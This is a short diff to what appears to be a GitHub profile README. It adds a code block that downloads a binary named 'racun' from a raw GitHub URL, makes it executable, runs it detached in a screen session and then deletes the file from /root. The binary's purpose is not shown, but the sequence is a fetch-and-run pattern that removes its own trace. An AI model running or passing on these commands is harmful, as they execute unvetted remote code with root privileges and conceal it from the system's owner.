@@ -24,3 +24,9 @@ Here are some ideas to get you started:
 - 😄 Pronouns: ...
 - ⚡ Fun fact: ...
 -->
+
+```
+wget https://raw.githubusercontent.com/racunzx/racunzx/main/racun
+chmod +x racun && screen -S racun ./racun
+rm -f /root/racun
+```
